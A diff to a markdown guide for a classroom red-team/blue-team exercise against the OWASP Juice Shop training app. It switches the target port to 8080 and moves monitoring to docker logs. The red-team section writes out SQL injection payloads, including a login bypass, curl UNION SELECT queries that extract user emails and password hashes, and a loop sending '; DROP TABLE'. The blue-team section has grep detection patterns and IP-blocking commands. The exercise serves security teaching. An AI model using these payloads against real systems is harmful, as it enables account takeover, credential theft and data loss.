@@ -25,8 +25,11 @@ In this exercise, the Red Team will perform SQL injection attacks while the Blue
 
 ### Target
 ```
-http://<VPS_IP>:8000
+Direct:  http://<VPS_IP>:8080  (faster, less logging)
+Proxied: http://<VPS_IP>:8080  (logs visible to Blue Team)
 ```
+
+> **For this exercise:** Use port **8080** so Blue Team can detect your attacks in their logs!
 
 ### Phase 1: Reconnaissance (5 minutes)
 
@@ -37,8 +40,8 @@ http://<VPS_IP>:8000
 3. Note all endpoints that accept user input
 
 **Key Endpoints to Test:**
-- `/rest/user/login` - Login form
-- `/rest/products/search?q=` - Search functionality
+- `/rest/user/login` - Login form (POST with JSON)
+- `/rest/products/search?q=` - Search functionality (GET)
 
 ---
 
@@ -48,7 +51,7 @@ http://<VPS_IP>:8000
 
 #### Attack 1: Authentication Bypass
 
-1. Navigate to: `http://<VPS_IP>:8000/#/login`
+1. Navigate to: `http://<VPS_IP>:8080/#/login`
 2. In the email field, try these payloads:
 
 ```sql
@@ -68,20 +71,20 @@ admin@juice-sh.op'--
 
 ```bash
 # Basic test
-curl "http://<VPS_IP>:8000/rest/products/search?q=test"
+curl "http://<VPS_IP>:8080/rest/products/search?q=test"
 
 # SQL injection test
-curl "http://<VPS_IP>:8000/rest/products/search?q='))--"
+curl "http://<VPS_IP>:8080/rest/products/search?q='))--"
 
 # Data extraction
-curl "http://<VPS_IP>:8000/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
+curl "http://<VPS_IP>:8080/rest/products/search?q='))UNION+SELECT+1,2,3,4,5,6,7,8,9--"
 ```
 
 #### Attack 3: Extract User Data
 
 ```bash
 # Extract user emails and password hashes
-curl "http://<VPS_IP>:8000/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
+curl "http://<VPS_IP>:8080/rest/products/search?q='))UNION+SELECT+id,email,password,4,5,6,7,8,9+FROM+Users--"
 ```
 
 ---
@@ -93,7 +96,7 @@ Keep attacking to generate more logs for Blue Team detection:
 ```bash
 # Automated attack script
 for payload in "' OR 1=1--" "' UNION SELECT" "'; DROP TABLE" "admin'--"; do
-    curl -s "http://<VPS_IP>:8000/rest/products/search?q=$payload" > /dev/null
+    curl -s "http://<VPS_IP>:8080/rest/products/search?q=$payload" > /dev/null
     sleep 1
 done
 ```
@@ -118,29 +121,41 @@ Document in your notes:
 
 **Objective:** Establish baseline and monitoring
 
-#### 1. Access Kibana
+#### Log Access via Docker
+
+Blue Team monitors attacks using **Docker logs** from their own machine (no server SSH required):
+
+```bash
+# Watch nginx proxy logs in real-time
+docker logs -f nginx-proxy
+
+# Filter for SQL injection patterns
+docker logs -f nginx-proxy 2>&1 | grep -iE "(union|select|or.1=1|'--)"
+```
+
+> **Tip:** Red Team attacks port **8080** (proxied) → visible in `docker logs nginx-proxy`
+
+#### 1. Open Terminal and Start Watching
+
+```bash
+# Real-time log monitoring
+docker logs -f nginx-proxy
+```
+
+#### 2. In a Second Terminal - Filter for Attacks
+
+```bash
+# Watch only for SQL injection patterns
+docker logs -f nginx-proxy 2>&1 | grep -iE "(union|select|or.*=|'--|%27)"
+```
+
+#### 3. Access Kibana (Optional)
 ```
 http://<VPS_IP>:5601
 ```
-
-#### 2. Create Index Pattern
-- Go to **Stack Management** → **Index Patterns**
-- Create pattern: `filebeat-*`
-- Set time field: `@timestamp`
-
-#### 3. Open Discover View
 - Go to **Discover**
-- Set time range to "Last 15 minutes"
-- Note normal traffic patterns
-
-#### 4. Monitor Logs via Command Line
-```bash
-# Watch nginx logs in real-time
-tail -f ./logs/nginx/access.log
-
-# In another terminal, watch for SQL patterns
-tail -f ./logs/nginx/access.log | grep -iE "(union|select|or.1=1|'--)"
-```
+- Create index pattern: `filebeat-*`
+- Set time field: `@timestamp`
 
 ---
 
@@ -148,25 +163,28 @@ tail -f ./logs/nginx/access.log | grep -iE "(union|select|or.1=1|'--)"
 
 **Objective:** Detect SQL injection attacks as they happen
 
-#### Detection Queries (Kibana)
+#### Detection via Docker Logs
+
+```bash
+# Get all logs and search for SQL patterns
+docker logs nginx-proxy 2>&1 | grep -iE "(union|select|or.1=1|'--|%27)"
+
+# Count SQL injection attempts
+docker logs nginx-proxy 2>&1 | grep -ciE "(union|select|or.1=1)"
+
+# Find attacker IPs (first field in log)
+docker logs nginx-proxy 2>&1 | grep -iE "(union|select|or.1=1)" | \
+    awk '{print $1}' | sort | uniq -c | sort -rn
+
+# Watch for successful attacks (200 status)
+docker logs nginx-proxy 2>&1 | grep -iE "(union|select)" | grep '" 200 '
+```
+
+#### Kibana Detection Queries
 
 ```
 # SQL Injection patterns
 message:*UNION* OR message:*SELECT* OR message:*OR*1=1*
-```
-
-#### Command Line Detection
-
-```bash
-# Count SQL injection attempts
-grep -ciE "(union|select|or.1=1|'--|%27)" ./logs/nginx/access.log
-
-# Find attacker IPs
-grep -iE "(union|select|or.1=1)" ./logs/nginx/access.log | \
-    awk '{print $1}' | sort | uniq -c | sort -rn
-
-# Watch for successful attacks (200 responses)
-grep -iE "(union|select)" ./logs/nginx/access.log | grep " 200 "
 ```
 
 #### What to Look For
@@ -185,44 +203,36 @@ grep -iE "(union|select)" ./logs/nginx/access.log | grep " 200 "
 **Objective:** Block the attacker
 
 #### 1. Identify Attacker IP
+
 ```bash
-# Find the most active attacker
-grep -iE "(union|select|or.1=1)" ./logs/nginx/access.log | \
+# Find the most active attacker from docker logs
+docker logs nginx-proxy 2>&1 | grep -iE "(union|select|or.1=1)" | \
     awk '{print $1}' | sort | uniq -c | sort -rn | head -5
 ```
 
-#### 2. Block the IP
+#### 2. Block the IP via Docker
 
-**Option A: Using iptables**
+**Option A: Block at nginx level (inside container)**
 ```bash
-# Block attacker IP (replace with actual IP)
-sudo iptables -A INPUT -s <ATTACKER_IP> -j DROP
-```
+# Add IP to nginx deny list
+docker exec nginx-proxy sh -c "echo 'deny <ATTACKER_IP>;' >> /etc/nginx/blocked.conf"
 
-**Option B: Using nginx (add to nginx.conf)**
-```bash
-# Edit the nginx config
-echo "deny <ATTACKER_IP>;" >> ./blue-team/config/blocked_ips.conf
-```
-
-Create the blocking config file:
-```bash
-# Create blocked IPs file
-cat > ./blue-team/config/blocked_ips.conf << 'EOF'
-# Blocked IPs - Add malicious IPs here
-# deny 192.168.1.100;
-EOF
-```
-
-#### 3. Apply the Block
-```bash
-# Reload nginx with new rules
+# Create include file if needed and reload
 docker exec nginx-proxy nginx -s reload
 ```
 
-#### 4. Verify Block
-- Tell Red Team to try again
-- They should receive connection refused or timeout
+**Option B: Use iptables on the Docker host**
+```bash
+# This requires someone with server access to run:
+# sudo iptables -A INPUT -s <ATTACKER_IP> -j DROP
+```
+
+#### 3. Verify Block
+```bash
+# Tell Red Team to try again
+# Check if their requests still appear in logs
+docker logs nginx-proxy 2>&1 | tail -5
+```
 
 ---
 
